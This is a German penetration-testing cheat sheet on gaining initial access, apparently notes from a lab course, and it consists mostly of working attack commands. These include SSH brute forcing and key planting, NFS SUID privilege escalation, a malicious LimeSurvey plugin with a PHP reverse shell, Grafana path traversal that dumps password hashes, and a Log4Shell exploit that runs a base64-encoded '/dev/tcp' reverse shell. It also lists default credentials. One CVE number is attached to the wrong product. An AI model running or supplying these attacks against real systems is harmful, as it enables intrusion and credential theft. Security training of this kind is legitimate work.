# Initial-Access

## 1. Ziel der Inital-Access Phase

- Erste Shell oder Zugriff auf das Zielsystem erlangen
- Durch Ausnutzung von Schwachstellen
- Durch Fehlkonfigurationen
- Durch schwache Credentials
---

## 2. Relevante Techniken & Vorgehensweisen

### Exploitation-Methoden

- FTP Anonymous Access & File Upload
- SMB/Samba Credential-basierter Zugriff
- SSH Brute Force / Password Reuse
- Web Application Exploits (RCE, File Upload)
- CMS-spezifische Vulnerabilities
- Log4Shell (JNDI Injection)
- LFI (Local File Inclusion)
- Container-basierte Exploits

### Credential-basierter Zugriff

- Default Credentials
- Credential Discovery (Config Files, Databases)
- Password Cracking (Hashcat)
- Password Reuse Testing

---

## 3. Betriebssystem-spezifische Aspekte (Linux)

- Container-Umgebungen (Docker) erfordern Container Escape
- Environment Variables enthalten oft Credentials
- Config Files in `/opt`, `/var/www/html`, `/etc`
- SSH Key-based Authentication
- Tomcat/Apache/Nginx als primäre Web-Server

---

## 4. Typische Angriffsflächen / Ansatzpunkte

### FTP (Port 21)

- Anonymous Login
- Writable Directories
- File Upload für Reverse Shells

### SSH (Port 22)

- Brute Force mit Hydra
- Password Reuse
- SSH Key Planting

### SMB/Samba (Port 139/445)

- Share Enumeration
- Credential Testing
- File Download/Upload

### NFS (Port 2049)

- Misconfigured Exports
- `no_root_squash` Exploitation

### Web (Port 80/443/8080/3000)

- CMS Vulnerabilities (LimeSurvey, Navigate CMS, Grafana)
- File Upload (PHP Reverse Shell)
- LFI (Path Traversal)
- Authenticated RCE
- Log4Shell (JNDI Injection)

---

## 5. Wichtige Befehle, Tools & Syntax

### FTP Exploitation

**Anonymous Login**


```bash
ftp 192.168.xx.x
# Username: anonymous
# Password: (leer oder anonymous)
```

**FTP Commands**


```bash
# Directory Listing
ls
ls -la

# Directory wechseln
cd upload

# Datei herunterladen
get creds.txt

# Datei hochladen
put shell.sh

# Multiple Files (Interactive Mode ausschalten)
prompt off
mget *

# Rekursiv downloaden
recurse on
mget *

# Binary Mode
binary

# Exit
exit
```

**NetExec (FTP)**


```bash
# Share Listing
nxc ftp 192.168.xx.x -u anonymous -p '' --ls

# Spezifisches Directory
nxc ftp 192.168.xx.x -u anonymous -p '' --ls upload

# Datei downloaden
nxc ftp 192.168.xx.x -u anonymous -p '' --get upload/creds.txt
```

### SMB/Samba Exploitation

**NetExec (SMB)**


```bash
# Credential Testing
nxc smb 192.168.xx.x -u tom -p 'P@ssw0rd!'

# Share Enumeration
nxc smb 192.168.xx.x -u tom -p 'P@ssw0rd!' --shares
```

**SMBClient**


```bash
# Share Listing
smbclient -L //192.168.xx.x -N

# Share Access
smbclient "\\\\192.168.xx.x\\shared" -U tom
# Password: P@ssw0rd!

# SMBClient Commands
ls
cd IT
get new_users.txt
pwd

# Prompt off + Recursive + mget
prompt off
recurse on
mget *
```

**Mount CIFS**


```bash
# Share mounten
sudo mount -t cifs //192.168.xx.x/shared mount -o username=tom,password='P@ssw0rd!'

# Read-Only Mount
sudo mount -t cifs //192.168.xx.x/shared mount -o username=tom,password='P@ssw0rd!',ro

# Unmount
sudo umount mount
```

### NFS Exploitation

**Showmount**


```bash
showmount -e 192.168.xx.x
```

**NetExec (NFS)**


```bash
nxc nfs 192.168.xx.x
# Output: (root escape:True) = no_root_squash aktiv
```

**Mount NFS**


```bash
sudo mount -t nfs 192.168.xx.x:/home/bob mount
```

**SUID Binary via NFS (Container Escape)**


```bash
# Als root auf Angreifer-Maschine
cp /bin/bash .
chmod u+s bash

# Auf Zielsystem via SSH
./bash -p
```

### SSH Exploitation

**Brute Force (Hydra)**


```bash
hydra -l alice -P alice_passwords.txt ssh://192.168.xx.x -I
```

**NetExec (SSH)**


```bash
# Single Password
nxc ssh 192.168.xx.x -u alice -p 'alice1985!'

# Wordlist
nxc ssh 192.168.xx.x -u alice -p alice_passwords.txt
```

**SSH Login**


```bash
ssh alice@192.168.xx.x
# Password: alice1985!

# Mit Key
ssh -i ~/SimpleCyber/rsa.txt alice@192.168.xx.x
```

**SSH Key Planting**


```bash
# Key generieren
ssh-keygen -t rsa

# Public Key anzeigen
cat /home/kali/SimpleCyber/rsa.txt.pub

# Auf Zielsystem (als Zieluser)
cd .ssh
touch authorized_keys
nano authorized_keys
# Public Key einfügen
chmod 600 authorized_keys
```

### Web Application Exploitation

**LimeSurvey RCE (CVE-2021-43798)**

**Voraussetzungen:**

- MariaDB auf Kali-Maschine
- Admin-Account in LimeSurvey erstellt

**MariaDB Setup**


```bash
# Installation
sudo apt update
sudo apt install -y mariadb-server

# Service starten
sudo systemctl start mariadb
sudo systemctl enable mariadb

# Config anpassen
sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
# Ändern: bind-address = 0.0.0.0

# Service neustarten
sudo systemctl restart mariadb

# Database Setup
sudo mariadb -u root
```

**SQL Commands (MariaDB)**


```sql
CREATE DATABASE limesurveydb;
CREATE USER 'limesurveyuser'@'%' IDENTIFIED BY 'lime123';
GRANT SELECT, CREATE, INSERT, UPDATE, DELETE, ALTER, DROP, INDEX ON limesurveydb.* TO 'limesurveyuser'@'%';
FLUSH PRIVILEGES;
EXIT;
```

**Test DB Connection**


```bash
mysql -h 10.x.x.xxx -u limesurveyuser -plime123 limesurveydb
```

**LimeSurvey Installation:**

- Database type: MySQL
- Database location: KALI_IP
- Database user: limesurveyuser
- Database password: lime123
- Database name: limesurveydb
- Admin Username: admin
- Admin Password: admin123

**Malicious Plugin erstellen**

**config.xml anpassen:**


```bash
cd ~/Limesurvey-RCE
nano config.xml
```


```xml
<compatibility>
    <version>3.0</version>
    <version>4.0</version>
    <version>5.0</version>
    <version>6.3.7</version>
</compatibility>
```

**php-rev.php anpassen:**


```bash
nano php-rev.php
```


```php
<?php
$ip = '10.x.x.xxx';  // CHANGE THIS
$port = 4444;        // CHANGE THIS
```

**Plugin ZIP erstellen:**


```bash
zip Y1LD1R1M.zip config.xml php-rev.php
```

**Listener starten:**


```bash
nc -nlvp 4444
```

**Plugin Upload:**

- Navigate to: [http://TARGET/survey/index.php/admin/pluginmanager?sa=index](http://TARGET/survey/index.php/admin/pluginmanager?sa=index)
- Upload & Install
- Plugin aktivieren

**Reverse Shell triggern:**


```bash
curl http://TARGET/survey/upload/plugins/Y1LD1R1M/php-rev.php
```

### Grafana LFI (CVE-2021-43798)

**Exploit Script**


```bash
searchsploit -m multiple/webapps/50581.py
python3 50581.py -H http://10.x.x.xxx:3000
```

**Manuelle LFI**


```bash
# /etc/passwd lesen
curl "http://10.x.x.xxx:3000/public/plugins/zipkin/../../../../../../../../etc/passwd" --path-as-is

# Container-ID
curl "http://10.x.x.xxx:3000/public/plugins/zipkin/../../../../../../../../etc/hostname" --path-as-is

# Grafana Database downloaden
curl "http://10.x.x.xxx:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db" --path-as-is -o grafana.db
```

**Credentials extrahieren**


```bash
sqlite3 grafana.db "SELECT login, password, salt FROM user;"
```

**Hash Convert (Go Script)**


```go
package main

import (
    b64 "encoding/base64"
    hex "encoding/hex"
    "fmt"
)

func convertHash(username string, password string, salt string) {
    decoded_hash, _ := hex.DecodeString(password)
    hash64 := b64.StdEncoding.EncodeToString([]byte(decoded_hash))
    salt64 := b64.StdEncoding.EncodeToString([]byte(salt))
    
    fmt.Printf("# User: %s\n", username)
    fmt.Printf("sha256:10000:%s:%s\n\n", salt64, hash64)
}

func main() {
    convertHash(
        "boris",
        "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8",
        "LCBhdtJWjl",
    )
}
```


```bash
go run convert.go > hashes.txt
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Log4Shell (CVE-2021-44228)

**Marshalsec Setup**


```bash
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
sudo apt install default-jdk maven -y
mvn clean package -DskipTests
```

**Exploit.java erstellen**


```bash
# Reverse Shell Base64 encodieren
echo 'bash -i >& /dev/tcp/10.x.x.xxx/4444 0>&1' | base64 -w0
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjYuMjQ4LzQ0NDQgMD4mMQ==
```


```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjYuMjQ4LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

**Kompilieren (Java 8 Target)**


```bash
javac -source 8 -target 8 Exploit.java
```

**Terminal 1: LDAP Server**


```bash
cd marshalsec
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.x.x.xxx:8000/#Exploit"
```

**Terminal 2: HTTP Server**


```bash
python3 -m http.server 8000
```

**Terminal 3: Netcat Listener**


```bash
nc -lvnp 4444
```

**Terminal 4: Payload senden**


````bash
# URL-encoded Payload
curl "http://10.x.x.xxx:8080/feedback/logfeedback.action?name=%24%7bjndi%3aldap%3a%2f%2f10.x.x.xxx%3a1389%2fa%7d&feedback=test"
```

**Raw Payload:**
```
${jndi:ldap://10.x.x.xxx:1389/a}
````

### Navigate CMS RCE (Metasploit)


```bash
msfconsole
use exploit/multi/http/navigate_cms_rce
show options
set RHOSTS 192.168.xx.x
set VHOST blackpearl.tcm
exploit
```

**Shell Upgrade**


```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### PHP Reverse Shell Upload

**Shell vorbereiten**


```bash
nano shell.php
# Content von: https://github.com/pentestmonkey/php-reverse-shell
# IP anpassen: $ip = '192.168.xx.x';
# Port anpassen: $port = 1234;
```

**Listener**


```bash
nc -nvlp 1234
```

**Upload via Web Interface:**

- Profile -> Upload New Photo -> shell.php auswählen

### File Transfer

**Python HTTP Server (Kali)**


```bash
python3 -m http.server 8080
```

**Wget (Zielsystem)**


```bash
wget http://192.168.xx.x.5:8080/pspy64
chmod +x pspy64
```

**SCP**


```bash
# Von Kali zu Ziel
scp pspy64 alice@192.168.xx.x:/home/alice

# Von Ziel zu Kali
scp alice@192.168.xx.x:/usr/local/bin/log_collector /home/kali/SimpleCyber
```

**Base64 Transfer**


```bash
# Encode
base64 file.txt > file.txt.b64

# Decode
base64 -d file.txt.b64 > file.txt
```

---

## 6. Reihenfolge, Abhängigkeiten & Hinweise

### Standard-Workflow

1. **Credential Discovery Phase**
    - Anonymous Access testen (FTP, SMB, NFS)
    - Config Files suchen (via LFI, SMB, NFS)
    - Credentials extrahieren (Databases, ENV vars)
    - Hashes cracken
2. **Exploitation vorbereiten**
    - Listener starten (Netcat)
    - Payloads anpassen (IP/Port)
    - Benötigte Tools bereitstellen
3. **Initial Access erlangen**
    - Exploit ausführen
    - Shell stabilisieren
4. **Persistence etablieren (optional)**
    - SSH Keys planten
    - Backdoors einrichten

### Wichtige Hinweise

**FTP:**

- `prompt off` und `recurse on` für Massen-Downloads
- `binary` Mode für Binaries
- Upload-Permissions auf Shares prüfen

**SMB:**

- Read-Only Mount (`ro`) für sichere Enumeration
- NetExec ist lauter als smbclient
- Credentials oft wiederverwendet (SMB → SSH)

**NFS:**

- `no_root_squash` = Root-Rechte im Container = Host-Root über SUID
- Mount-Points für Container Escape kritisch

**SSH:**

- Custom Wordlists für Brute Force (Namen + Jahre + Sonderzeichen)
- Password Reuse zwischen Services testen
- SSH Keys für Persistence

**Web Exploitation:**

- Shell stabilisieren nach Initial Access
- Listener auf eigenem Port für jede Session
- Environment Variables immer prüfen (`env | grep -i pass`)

**Log4Shell:**

- Java 8 Target für Exploit.class zwingend
- Marshalsec LDAP auf Port 1389
- HTTP Server im Verzeichnis mit Exploit.class
- Payload muss URL-encoded sein

**LimeSurvey:**

- MariaDB muss von Target erreichbar sein
- Plugin-Upload benötigt Admin-Account
- Version in config.xml anpassen

**Grafana LFI:**

- `--path-as-is` Flag bei curl wichtig
- Container-ID aus `/etc/hostname`
- PBKDF2 Hashes (Hashcat Mode 10900)

### Shell Stabilisierung


````bash
# Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl+Z (Background)
# In lokaler Shell:
stty raw -echo; fg
# Enter drücken
export TERM=xterm
```

---

## 7. Typische Findings & Fehler

### Häufige Credentials

**FTP:**
- anonymous:anonymous
- anonymous:(leer)

**Default Credentials:**
- admin:admin
- admin:admin123
- admin:password
- root:root

**Discovered Credentials (Examples):**
- tom:P@ssw0rd!
- alice:alice1985!
- boris:beautiful1
- limesvc:5W5HN4K4GCXf9E
- buildadm:Git1234!

### Config File Locations
```
/var/www/html/wp-config.php
/var/www/html/academy/includes/config.php
/opt/tomcat/conf/tomcat-users.xml
/var/lib/grafana/grafana.db
/etc/ssh/sshd_config
````

### Environment Variables


```bash
# Alle ENV vars
env

# Password suchen
env | grep -i pass

# Beispiel Output:
LIMESURVEY_PASS=5W5HN4K4GCXf9E
```

### Typische Fehler

**FTP:**

- Nicht auf writable Directories geachtet
- Binary Mode vergessen bei Binaries
- Recursive Download ohne Größencheck

**SSH Brute Force:**

- Wordlist nicht auf Ziel angepasst
- Zu viele parallele Threads (Detection)
- Session Timeout nicht beachtet

**Web Exploits:**

- Listener nicht gestartet vor Trigger
- IP/Port in Payload nicht angepasst
- Shell nicht stabilisiert

**Log4Shell:**

- Falsche Java Version beim Kompilieren
- HTTP Server nicht im richtigen Directory
- LDAP Server auf falschem Port
- Payload nicht URL-encoded

**File Upload:**

- Falsche MIME Types
- File Extension Blacklists
- Max Upload Size nicht beachtet

**Container-Umgebungen:**

- Nicht erkannt dass in Container (`.dockerenv` File)
- Container-ID nicht notiert
- Mount-Points nicht geprüft

**Credential Reuse:**

- Nicht getestet (FTP → SSH, SMB → SSH, Tomcat → Root)
- Nur einen Service getestet
- Environment Variables nicht geprüft
